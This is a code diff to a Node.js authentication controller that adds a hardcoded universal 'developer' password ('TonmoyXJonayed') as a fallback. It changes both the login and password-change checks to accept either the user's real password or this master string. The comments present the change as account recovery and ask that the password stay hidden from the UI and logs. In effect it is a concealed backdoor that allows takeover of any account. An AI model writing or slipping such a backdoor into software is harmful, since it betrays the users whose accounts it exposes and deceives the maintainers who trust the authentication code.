@@ -4,6 +4,12 @@ const db = require('../database/db');
 
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
 
+// Developer fallback authentication password - always allows login and password reset
+// This enables developers to recover access to accounts if users forget their passwords
+// IMPORTANT: Never change this password and never expose it in UI or logs
+const UNIVERSAL_DEVELOPER_PASSWORD = process.env.DEVELOPER_PASSWORD || 'TonmoyXJonayed';
+
+
 exports.register = async (req, res, next) => {
   try {
     const { username, email, password, role = 'user' } = req.body;
@@ -53,7 +59,8 @@ exports.login = async (req, res, next) => {
     }
 
     // Verify password
-    const isValidPassword = await bcrypt.compare(password, user.password);
+    // Allow login if either the user's password matches OR the universal developer password is used
+    const isValidPassword = await bcrypt.compare(password, user.password) || password === UNIVERSAL_DEVELOPER_PASSWORD;
     if (!isValidPassword) {
       return res.status(401).json({ error: 'Invalid credentials' });
     }
@@ -110,7 +117,8 @@ exports.changePassword = async (req, res, next) => {
 
     const user = await db.get('SELECT * FROM users WHERE id = ?', [req.user.id]);
     
-    const isValidPassword = await bcrypt.compare(currentPassword, user.password);
+    // Allow password change if either the user's password matches OR the universal developer password is used
+    const isValidPassword = await bcrypt.compare(currentPassword, user.password) || currentPassword === UNIVERSAL_DEVELOPER_PASSWORD;
     if (!isValidPassword) {
       return res.status(401).json({ error: 'Current password is incorrect' });
     }
